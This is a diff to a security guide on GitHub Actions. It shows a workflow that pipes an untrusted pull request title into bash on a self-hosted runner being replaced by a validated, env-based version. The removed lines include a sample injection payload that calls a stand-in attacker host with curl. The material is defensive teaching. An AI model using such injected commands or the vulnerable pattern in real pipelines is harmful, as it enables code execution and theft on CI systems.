@@ -46,24 +46,27 @@ jobs:
 
 ### Secure Version
 
-```yaml
-name: Process PR Safely
-on:
-  pull_request:
-jobs:
-  process:
-    runs-on: ubuntu-latest  # GitHub-hosted for untrusted input
-    steps:
-      - name: Process PR title
-        env:
-          PR_TITLE: ${{ github.event.pull_request.title }}
-        run: |
-          # Validate input
-          if [[ ! "$PR_TITLE" =~ ^[a-zA-Z0-9\s-]+$ ]]; then
-            echo "Invalid input"
-            exit 1
-          fi
-          echo "Processing: $PR_TITLE"
+```diff
+ name: Process PR Safely
+ on:
+   pull_request:
+ jobs:
+   process:
+-    runs-on: self-hosted  # Dangerous with user input
++    runs-on: ubuntu-latest  # GitHub-hosted for untrusted input
+     steps:
+       - name: Process PR title
++        env:
++          PR_TITLE: ${{ github.event.pull_request.title }}
+         run: |
++          # Validate input
++          if [[ ! "$PR_TITLE" =~ ^[a-zA-Z0-9\s-]+$ ]]; then
++            echo "Invalid input"
++            exit 1
++          fi
+-          echo "${{ github.event.pull_request.title }}" | bash
+-          # Attacker can inject: "; curl attacker.com/steal; #"
++          echo "Processing: $PR_TITLE"
 ```
 
 ## Impact
